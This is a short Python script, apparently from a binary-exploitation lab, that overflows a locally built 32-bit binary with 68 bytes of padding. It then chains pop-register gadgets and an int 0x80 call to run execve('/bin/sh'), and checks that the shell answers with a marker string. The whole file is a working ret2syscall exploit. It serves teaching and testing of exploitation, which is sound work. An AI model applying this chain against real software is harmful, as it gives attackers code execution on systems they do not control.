from common import BUILD, execute, p32, print_result, symbols

binary = BUILD / "ret2syscall32"
sym = symbols(binary)
chain = b"".join(
    [
        p32(sym["gadget_pop_eax_ret"]), p32(11),
        p32(sym["gadget_pop_ebx_ret"]), p32(sym["binsh"]),
        p32(sym["gadget_pop_ecx_ret"]), p32(0),
        p32(sym["gadget_pop_edx_ret"]), p32(0),
        p32(sym["gadget_int80_ret"]),
    ]
)
payload = b"A" * 68 + chain
print(f"[ret2syscall] offset=68, eax=11, ebx=0x{sym['binsh']:08x}, ecx=edx=0")
status, output = execute(binary, [payload], b"echo RET2SYSCALL_OK\nexit\n")
print_result("ret2syscall", status, output, "RET2SYSCALL_OK")
